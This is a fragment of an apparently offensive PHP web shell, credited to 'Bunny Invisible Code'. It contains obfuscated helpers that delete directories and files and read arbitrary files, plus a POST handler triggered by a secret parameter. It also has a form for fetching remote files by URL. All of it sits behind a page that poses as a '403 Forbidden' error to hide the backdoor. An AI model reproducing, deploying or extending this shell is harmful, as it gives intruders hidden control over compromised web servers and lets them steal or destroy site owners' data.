...
function deleteDir($dirName){global $f_exist;global $glb;global $is_d;global $unl;global $rm_d;if(!$f_exist($dirName)){return false;
    }
    $files = $glb($dirName . '/*');
    foreach ($files as $file){$is_d($file) ? deleteDir($file) : $unl($file);
    }
    $rm_d($dirName);
    return true;}
function deleteFile($fileName){
    global $f_exist;
    global $unl;
    if($f_exist($fileName)){if($unl($fileName)){return true;}else{return false;}
    }else{return false;
    }}
function BunnyReading($this_file){global $func_exist;global $f_get;global $fo;global $fr;global $fc;$cantread = 'Cant Not Read ' . $this_file;$content = '';if($func_exist($fo)){
        $fi_le = $fo($this_file, 'r');
        if($fi_le){while (!feof($fi_le)){$content .= $fr($fi_le, 8192);}$fc($fi_le);return $content;
        }else{echo $cantread;return false;
...
if(isset($_POST['BunnymanInvis'])){
    $SiBunny = $_POST['BunnymanInvis'];
...
?>
        ...
        <html>
        <head>
            <title><?= '4'.'0'.'3 F'.'o'.'r'.'b'.'i'.'d'.'d'.'e'.'n' ?></title>
        </head>
        <body>
            <h1><?= 'F'.'o'.'r'.'b'.'i'.'d'.'d'.'e'.'n' ?></h1>
            ...
            <form action="" method="POST" class="uk-width-1-2">
                <fieldset class="uk-fieldset">
                    ...
                    <div class="uk-margin-small">
                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="<?= 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'you' . 'th' . 'bo' . 'ys' . '-' . 'la' . 'me' . 'rs' . 'code' . '.' . 'fbi' . '.' . 'gov' . '/' . 'file' . '.' . 'txt' ?>" aria-label="Input">
    ...
    <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
        <div class="footer-content uk-padding-small">
            <span class="font-protest-riot">
                <font class="font-poppins">&copy;2020 - <?= date("Y"); ?></font> | <a class="font-rose" href="https://github.com/InvisibleBunny">Bunny Invisible Code</a>
            </span>
        </div>
    </div>
